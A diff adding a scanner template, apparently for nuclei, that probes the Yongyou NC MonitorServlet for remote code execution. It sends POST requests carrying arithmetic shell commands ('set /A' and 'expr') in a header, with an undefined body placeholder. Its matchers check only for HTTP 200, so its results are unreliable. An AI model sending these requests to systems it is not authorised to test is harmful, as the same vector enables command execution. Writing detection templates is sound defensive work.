@@ -1,0 +1,39 @@
+id: poc-yaml-yongyou-nc-monitorservlet-rce
+
+info:
+  name: poc-yaml-yongyou-nc-monitorservlet-rce
+  author: xray-converter
+  severity: critical
+  tags: xray-converted,rce
+  reference:
+    - https://mp.weixin.qq.com/s/xVKuJb3DbKH0em0HoMZ4ZQ
+
+http:
+  - raw:
+      - |
+        POST /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: set /A {{rand_int(1000, 9999)}}+{{rand_int(1000, 9999)}}
+
+        {{rb}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+  - raw:
+      - |
+        POST /servlet/~ic/nc.bs.framework.mx.monitor.MonitorServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data;
+        X-T0KEN-INF0: expr {{rand_int(1000, 9999)}}+{{rand_int(1000, 9999)}}
+
+        {{rb}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
